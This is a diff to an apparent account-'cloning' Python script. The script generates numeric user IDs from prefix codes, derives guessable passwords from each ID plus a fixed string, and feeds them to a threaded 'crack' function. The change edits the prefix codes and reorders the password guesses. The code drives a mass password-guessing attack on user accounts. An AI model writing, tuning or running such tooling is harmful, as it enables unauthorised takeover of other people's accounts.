@@ -77,7 +77,7 @@ def menu():
 ###-------[DEF CLONING]-----------####
 def random_number():
     clear()
-    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Codes : \033[1;92m0310, 0320, 0330, 0340 ")
+    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Codes : \033[1;92m9987, 6787, 9009, 7233 ")
     print(f" \033[1;97m[\033[1;92m•\033[1;97m] Limit : \033[1;92m1000, 2000, 5000, 10000 ")
     linex()
     code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Code  :\033[1;92m ")
@@ -98,7 +98,7 @@ def random_number():
         linex()
         for xyz in idz:
             uid = code+xyz
-            pww = ['57273200',uid[:6],uid[:8],uid] 
+            pww = [uid[:6],'57273200',uid[:8],uid] 
          #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
             XYZ.submit(crack, uid, pww, total_idz)
     linex()
